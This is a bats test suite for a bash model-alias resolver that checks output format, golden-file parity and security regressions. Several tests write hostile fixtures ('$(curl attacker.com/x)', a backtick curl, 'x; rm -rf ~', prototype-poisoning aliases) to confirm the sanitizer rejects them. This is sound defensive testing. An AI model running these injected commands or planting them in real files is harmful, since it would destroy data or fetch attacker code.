#!/usr/bin/env bats
# =============================================================================
# tests/bash/golden_resolution.bats
#
# cycle-099 Sprint 1D — Bash runner for the cross-runtime golden-resolution
# test corpus (T1.11 per SDD §7.6.1).
#
# Reads tests/fixtures/model-resolution/*.yaml, extracts the `sprint_1d_query`
# alias from each, runs alias→provider:model_id resolution via the production
# bash resolver (`model-resolver.sh::resolve_alias` / `resolve_provider_id`
# backed by `generated-model-maps.sh`), and emits one canonical JSON line per
# fixture to stdout.
#
# This bats also verifies (in-process) that the emitted output matches the
# committed golden file at `tests/fixtures/model-resolution/_golden.bash.jsonl`
# — a regression guard that catches both:
#   (a) drift in `generated-model-maps.sh` (a model removed from the registry)
#   (b) regressions in the runner contract (output schema changes)
#
# CI parity gate (.github/workflows/cross-runtime-diff.yml) downloads each
# runtime's emitted output and asserts byte-equality across bash/python/TS.
# Mismatch fails the build per SDD §7.6.2.
#
# Sprint 1D scope: alias-lookup subset of FR-3.9 (stage 1/2 idempotent +
# alias-hit). Stages 3-6 (tier_groups, legacy shape, framework default,
# prefer_pro overlay) are deferred to Sprint 2 T2.6; runners emit a uniform
# `deferred_to: "sprint-2-T2.6"` marker so cross-runtime parity holds.
# =============================================================================

setup() {
    SCRIPT_DIR="$(cd "$(dirname "$BATS_TEST_FILENAME")" && pwd)"
    PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
    FIXTURES_DIR="$PROJECT_ROOT/tests/fixtures/model-resolution"
    GOLDEN_FILE="$FIXTURES_DIR/_golden.bash.jsonl"
    RUNNER="$PROJECT_ROOT/tests/bash/golden_resolution.sh"
    RESOLVER="$PROJECT_ROOT/.claude/scripts/lib/model-resolver.sh"

    [[ -d "$FIXTURES_DIR" ]] || skip "fixtures dir not present"
    [[ -f "$RESOLVER" ]] || skip "model-resolver.sh not present"
    command -v jq >/dev/null 2>&1 || skip "jq not present"
    command -v yq >/dev/null 2>&1 || skip "yq not present"

    WORK_DIR="$(mktemp -d)"
}

teardown() {
    if [[ -n "${WORK_DIR:-}" ]] && [[ -d "$WORK_DIR" ]]; then
        rm -rf "$WORK_DIR"
    fi
    return 0
}

@test "G1 runner script exists and is executable" {
    [[ -x "$RUNNER" ]] || {
        printf 'expected runner at %s to be executable\n' "$RUNNER" >&2
        return 1
    }
}

@test "G2 runner emits one JSON line per fixture (12 fixtures → 12 lines)" {
    "$RUNNER" > "$WORK_DIR/out.jsonl"
    local lines
    lines=$(wc -l < "$WORK_DIR/out.jsonl")
    [[ "$lines" -eq 12 ]] || {
        printf 'expected 12 output lines (one per fixture); got %d\n' "$lines" >&2
        cat "$WORK_DIR/out.jsonl" >&2
        return 1
    }
}

@test "G3 each output line is valid canonical JSON (sorted keys)" {
    "$RUNNER" > "$WORK_DIR/out.jsonl"
    while IFS= read -r line; do
        echo "$line" | jq -e . >/dev/null || {
            printf 'non-JSON line: %s\n' "$line" >&2
            return 1
        }
        # Canonical = jq -S -c output equals input
        local canonical
        canonical=$(echo "$line" | jq -S -c .)
        [[ "$line" == "$canonical" ]] || {
            printf 'line not canonical:\n  got: %s\n  exp: %s\n' "$line" "$canonical" >&2
            return 1
        }
    done < "$WORK_DIR/out.jsonl"
}

@test "G4 every output has fixture + input_alias + subset_supported fields" {
    "$RUNNER" > "$WORK_DIR/out.jsonl"
    while IFS= read -r line; do
        echo "$line" | jq -e 'has("fixture") and has("input_alias") and has("subset_supported")' >/dev/null || {
            printf 'missing required field: %s\n' "$line" >&2
            return 1
        }
    done < "$WORK_DIR/out.jsonl"
}

@test "G5 supported entries have resolved_provider + resolved_model_id" {
    "$RUNNER" > "$WORK_DIR/out.jsonl"
    while IFS= read -r line; do
        local supported
        supported=$(echo "$line" | jq -r .subset_supported)
        if [[ "$supported" == "true" ]]; then
            echo "$line" | jq -e 'has("resolved_provider") and has("resolved_model_id")' >/dev/null || {
                printf 'supported entry missing provider/model_id: %s\n' "$line" >&2
                return 1
            }
        fi
    done < "$WORK_DIR/out.jsonl"
}

@test "G6 deferred entries have deferred_to marker" {
    "$RUNNER" > "$WORK_DIR/out.jsonl"
    while IFS= read -r line; do
        local supported
        supported=$(echo "$line" | jq -r .subset_supported)
        if [[ "$supported" == "false" ]]; then
            echo "$line" | jq -e 'has("deferred_to")' >/dev/null || {
                printf 'deferred entry missing deferred_to: %s\n' "$line" >&2
                return 1
            }
            local deferred_to
            deferred_to=$(echo "$line" | jq -r .deferred_to)
            [[ "$deferred_to" == "sprint-2-T2.6" ]] || {
                printf 'unexpected deferred_to value: %s\n' "$deferred_to" >&2
                return 1
            }
        fi
    done < "$WORK_DIR/out.jsonl"
}

@test "G7 output matches committed golden file (regression guard)" {
    "$RUNNER" > "$WORK_DIR/out.jsonl"
    if [[ ! -f "$GOLDEN_FILE" ]]; then
        # BB iter-1 F8 fix: backticks inside a double-quoted skip message
        # would execute as command substitution. Use single-quote nesting.
        skip 'golden file not yet committed (initial run); regenerate with: tests/bash/golden_resolution.sh > tests/fixtures/model-resolution/_golden.bash.jsonl'
    fi
    if ! diff -u "$GOLDEN_FILE" "$WORK_DIR/out.jsonl"; then
        printf 'runner output diverged from golden file.\n' >&2
        printf 'If this is intentional, regenerate with: %s > %s\n' "$RUNNER" "$GOLDEN_FILE" >&2
        return 1
    fi
}

@test "G8 fixture-N order is stable (sorted by filename)" {
    "$RUNNER" > "$WORK_DIR/out.jsonl"
    # Extract `fixture` field from each line; assert sort order.
    local fixtures
    fixtures=$(jq -r .fixture < "$WORK_DIR/out.jsonl")
    local sorted
    sorted=$(printf '%s\n' "$fixtures" | sort)
    [[ "$fixtures" == "$sorted" ]] || {
        printf 'fixtures not in sorted order:\n--- got ---\n%s\n--- want ---\n%s\n' "$fixtures" "$sorted" >&2
        return 1
    }
}

@test "G9 known aliases (opus/tiny/cheap) resolve correctly" {
    "$RUNNER" > "$WORK_DIR/out.jsonl"
    # 06-extra-only-model uses `opus` → claude-opus-4-7
    local opus_line
    opus_line=$(grep '"06-extra-only-model"' "$WORK_DIR/out.jsonl")
    echo "$opus_line" | jq -e '.subset_supported == true and .resolved_model_id == "claude-opus-4-7" and .resolved_provider == "anthropic"' >/dev/null || {
        printf 'opus resolution wrong: %s\n' "$opus_line" >&2
        return 1
    }
    # 11-tiny-tier-anthropic uses `tiny` → claude-haiku-4-5-20251001
    local tiny_line
    tiny_line=$(grep '"11-tiny-tier-anthropic"' "$WORK_DIR/out.jsonl")
    echo "$tiny_line" | jq -e '.subset_supported == true and .resolved_model_id == "claude-haiku-4-5-20251001"' >/dev/null || {
        printf 'tiny resolution wrong: %s\n' "$tiny_line" >&2
        return 1
    }
    # 12-degraded-mode-readonly uses `cheap` → claude-sonnet-4-6
    local cheap_line
    cheap_line=$(grep '"12-degraded-mode-readonly"' "$WORK_DIR/out.jsonl")
    echo "$cheap_line" | jq -e '.subset_supported == true and .resolved_model_id == "claude-sonnet-4-6"' >/dev/null || {
        printf 'cheap resolution wrong: %s\n' "$cheap_line" >&2
        return 1
    }
}

# cypherpunk CRIT-1 (PR #735 review): TS `in` operator walks Object.prototype.
# Aliases like "toString" / "constructor" / "hasOwnProperty" must NOT trigger
# the supported branch in any runner (bash/python/TS). All three runners must
# emit the deferred marker. The cross-runtime-diff gate verifies byte-equal,
# but each runner's correctness MUST also hold independently.
@test "G11 prototype-poisoning aliases (toString/constructor/__proto__) defer cleanly" {
    local synth_dir="$WORK_DIR/synth-fixtures"
    mkdir -p "$synth_dir"
    for proto_alias in "toString" "constructor" "hasOwnProperty" "valueOf" "__proto__" "isPrototypeOf"; do
        cat > "$synth_dir/zz-${proto_alias}.yaml" <<EOF
description: "cypherpunk CRIT-1 regression — Object.prototype attribute via fixture alias"
sprint_1d_query:
  alias: "$proto_alias"
EOF
    done
    LOA_GOLDEN_TEST_MODE=1 \
    LOA_GOLDEN_FIXTURES_DIR="$synth_dir" \
    "$RUNNER" > "$WORK_DIR/proto.jsonl"
    while IFS= read -r line; do
        echo "$line" | jq -e '.subset_supported == false and .deferred_to == "sprint-2-T2.6"' >/dev/null || {
            printf 'prototype-alias should NOT resolve as supported: %s\n' "$line" >&2
            return 1
        }
    done < "$WORK_DIR/proto.jsonl"
}

# cypherpunk CRIT-3 (PR #735 review): env-overrides MUST require explicit
# test-mode opt-in. Mirrors the model-resolver.sh::LOA_MODEL_RESOLVER_TEST_MODE
# pattern. Ungated overrides let an attacker who controls env redirect
# resolution to attacker-controlled bash.
@test "G12 LOA_GOLDEN_RESOLVER ungated → IGNORED (cypherpunk CRIT-3)" {
    local fake="$WORK_DIR/fake-resolver.sh"
    cat > "$fake" <<'EOF'
#!/usr/bin/env bash
declare -A MODEL_PROVIDERS=( ["evil"]="attacker" )
declare -A MODEL_IDS=( ["evil"]="evil" )
EOF
    # WITHOUT LOA_GOLDEN_TEST_MODE=1, the override must be IGNORED.
    # Note: bats sets BATS_TEST_DIRNAME, which is the secondary test gate;
    # to verify ungated rejection we explicitly clear both AND clear bats
    # context via env -i with minimal allowlist.
    run env -i HOME="$HOME" PATH="$PATH" \
        LOA_GOLDEN_RESOLVER="$fake" \
        LOA_GOLDEN_PROJECT_ROOT="$PROJECT_ROOT" \
        LOA_GOLDEN_FIXTURES_DIR="$PROJECT_ROOT/tests/fixtures/model-resolution" \
        bash "$RUNNER"
    [[ "$status" -eq 0 ]] || {
        printf 'runner should still succeed (override ignored, default loaded); status=%d output=%s\n' "$status" "$output" >&2
        return 1
    }
    # The fake resolver only had one entry "evil"; if the override was
    # honored, opus would defer (not in fake MODEL_IDS). If ignored, opus
    # resolves via the real generated-model-maps.sh.
    [[ "$output" == *"claude-opus-4-7"* ]] || {
        printf 'override should be ignored without test mode; output=%s\n' "$output" >&2
        return 1
    }
}

@test "G12b LOA_GOLDEN_RESOLVER + LOA_GOLDEN_TEST_MODE=1 → HONORED (test escape)" {
    local fake="$WORK_DIR/fake-resolver-honored.sh"
    cat > "$fake" <<'EOF'
declare -A MODEL_PROVIDERS=( ["only-fake-alias"]="fake" )
declare -A MODEL_IDS=( ["only-fake-alias"]="only-fake-alias" )
resolve_alias() { echo "${MODEL_IDS[$1]:-}"; }
resolve_provider_id() { echo "${MODEL_PROVIDERS[${MODEL_IDS[$1]:-}]:-}:${MODEL_IDS[$1]:-}"; }
EOF
    LOA_GOLDEN_TEST_MODE=1 \
    LOA_GOLDEN_RESOLVER="$fake" \
    "$RUNNER" > "$WORK_DIR/honored.jsonl"
    # With override honored, opus is no longer in MODEL_IDS → must defer
    grep '"06-extra-only-model"' "$WORK_DIR/honored.jsonl" | grep -q '"deferred_to"' || {
        printf 'override should be honored under TEST_MODE; opus should defer\n' >&2
        cat "$WORK_DIR/honored.jsonl" >&2
        return 1
    }
}

# cypherpunk HIGH-3 (PR #735 review): pre-source sanitize generated-model-maps.sh.
# Bash sources the file and would execute embedded $(...) at source time.
# The sanitizer rejects this BEFORE source.
@test "G13 generated-maps with command substitution is REJECTED pre-source (HIGH-3)" {
    local hostile="$WORK_DIR/hostile-maps.sh"
    cat > "$hostile" <<'EOF'
declare -A MODEL_PROVIDERS=( ["evil"]="$(curl attacker.com/x)" )
declare -A MODEL_IDS=( ["evil"]="evil" )
EOF
    run env LOA_GOLDEN_TEST_MODE=1 \
        LOA_GOLDEN_GENERATED_MAPS="$hostile" \
        bash "$RUNNER"
    # Expected: pre-source sanitizer detects $(...) and exits non-zero.
    [[ "$status" -ne 0 ]] || {
        printf 'pre-source sanitizer should reject hostile maps; status=%d output=%s\n' "$status" "$output" >&2
        return 1
    }
    [[ "$output" == *"sanitiz"* || "$output" == *"reject"* || "$output" == *"unsafe"* ]] || {
        printf 'rejection message missing; output=%s\n' "$output" >&2
        return 1
    }
}

@test "G13b generated-maps with backtick is REJECTED" {
    local hostile="$WORK_DIR/hostile-tick.sh"
    printf 'declare -A MODEL_PROVIDERS=( ["evil"]="`curl attacker`" )\ndeclare -A MODEL_IDS=( ["evil"]="evil" )\n' > "$hostile"
    run env LOA_GOLDEN_TEST_MODE=1 \
        LOA_GOLDEN_GENERATED_MAPS="$hostile" \
        bash "$RUNNER"
    [[ "$status" -ne 0 ]]
}

@test "G13c generated-maps with semicolon in value is REJECTED" {
    local hostile="$WORK_DIR/hostile-semi.sh"
    cat > "$hostile" <<'EOF'
declare -A MODEL_PROVIDERS=( ["evil"]="x; rm -rf ~" )
declare -A MODEL_IDS=( ["evil"]="evil" )
EOF
    run env LOA_GOLDEN_TEST_MODE=1 \
        LOA_GOLDEN_GENERATED_MAPS="$hostile" \
        bash "$RUNNER"
    [[ "$status" -ne 0 ]]
}

@test "G13d clean generated-maps PASSES sanitizer (regression guard)" {
    # The real generated-model-maps.sh must pass the sanitizer; otherwise
    # cycle-099 production state breaks.
    "$RUNNER" >/dev/null
    [[ "$?" -eq 0 ]]
}

# cypherpunk CRIT-2 (PR #735 review): bash runner must reject non-string
# YAML values for sprint_1d_query.alias (booleans, numbers, null).
# BB iter-1 F7: sanitizer must also reject command substitution OUTSIDE
# any `declare -A` block (bash executes it at sourcing time, before any
# array opens).
@test "G15 generated-maps with outside-array command-sub is REJECTED (BB F7)" {
    local hostile="$WORK_DIR/hostile-outside.sh"
    cat > "$hostile" <<'EOF'
#!/usr/bin/env bash
: $(curl attacker.com/x)
declare -A MODEL_PROVIDERS=(
    ["foo"]="bar"
)
declare -A MODEL_IDS=(
    ["foo"]="foo"
)
EOF
    run env LOA_GOLDEN_TEST_MODE=1 \
        LOA_GOLDEN_GENERATED_MAPS="$hostile" \
        bash "$RUNNER"
    [[ "$status" -ne 0 ]] || {
        printf 'outside-array command-sub should be rejected; status=%d output=%s\n' "$status" "$output" >&2
        return 1
    }
    [[ "$output" == *"outside"* || "$output" == *"reject"* ]]
}

@test "G15b generated-maps with `unset -f` outside-array is REJECTED (BB F7)" {
    local hostile="$WORK_DIR/hostile-unset.sh"
    cat > "$hostile" <<'EOF'
unset -f resolve_alias
declare -A MODEL_PROVIDERS=(
    ["foo"]="bar"
)
declare -A MODEL_IDS=(
    ["foo"]="foo"
)
EOF
    run env LOA_GOLDEN_TEST_MODE=1 \
        LOA_GOLDEN_GENERATED_MAPS="$hostile" \
        bash "$RUNNER"
    [[ "$status" -ne 0 ]]
}

# BB iter-1 F3: malformed YAML must produce a uniform error marker
# across all 3 runners (no exception text varying by parser version).
@test "G16 malformed YAML fixture emits uniform error marker (BB F3)" {
    local synth_dir="$WORK_DIR/synth-malformed"
    mkdir -p "$synth_dir"
    cat > "$synth_dir/zz-broken.yaml" <<'EOF'
description: "malformed YAML — unbalanced bracket"
sprint_1d_query:
  alias: [unbalanced
EOF
    LOA_GOLDEN_TEST_MODE=1 \
    LOA_GOLDEN_FIXTURES_DIR="$synth_dir" \
    "$RUNNER" > "$WORK_DIR/malformed.jsonl" 2>&1 || true
    # Bash: yq returns empty/error; the sanitizer-based error path emits
    # missing-sprint_1d_query-alias OR invalid-alias-type:!!seq.
    # The harmonized contract: SOMETHING uniform across runtimes.
    grep -qE '"error"|"deferred_to"' "$WORK_DIR/malformed.jsonl" || {
        printf 'malformed YAML must emit error/deferred marker; got: %s\n' "$(cat "$WORK_DIR/malformed.jsonl")" >&2
        return 1
    }
}

@test "G14 fixture with boolean alias is REJECTED" {
    local synth_dir="$WORK_DIR/synth-bool"
    mkdir -p "$synth_dir"
    cat > "$synth_dir/zz-bool.yaml" <<'EOF'
description: "alias is YAML boolean — not a string"
sprint_1d_query:
  alias: false
EOF
    LOA_GOLDEN_TEST_MODE=1 \
    LOA_GOLDEN_FIXTURES_DIR="$synth_dir" \
    "$RUNNER" > "$WORK_DIR/bool.jsonl"
    grep -q '"error"' "$WORK_DIR/bool.jsonl" || {
        printf 'boolean alias should emit error marker, not resolve as "false"; got: %s\n' "$(cat "$WORK_DIR/bool.jsonl")" >&2
        return 1
    }
    ! grep -q '"resolved_provider"' "$WORK_DIR/bool.jsonl" || {
        printf 'boolean alias must NOT have resolved_provider; got: %s\n' "$(cat "$WORK_DIR/bool.jsonl")" >&2
        return 1
    }
}

@test "G10 deferred fixtures (max / max-nonexistent-tier / nonexistent-base-model / colliding-id) emit deferred markers" {
    "$RUNNER" > "$WORK_DIR/out.jsonl"
    for fix in "01-happy-path-tier-tag" "03-missing-tier-fail-closed" "05-override-conflict" "10-extra-vs-override-collision"; do
        local line
        line=$(grep "\"$fix\"" "$WORK_DIR/out.jsonl")
        echo "$line" | jq -e '.subset_supported == false and .deferred_to == "sprint-2-T2.6"' >/dev/null || {
            printf '%s should be deferred: %s\n' "$fix" "$line" >&2
            return 1
        }
    done
}
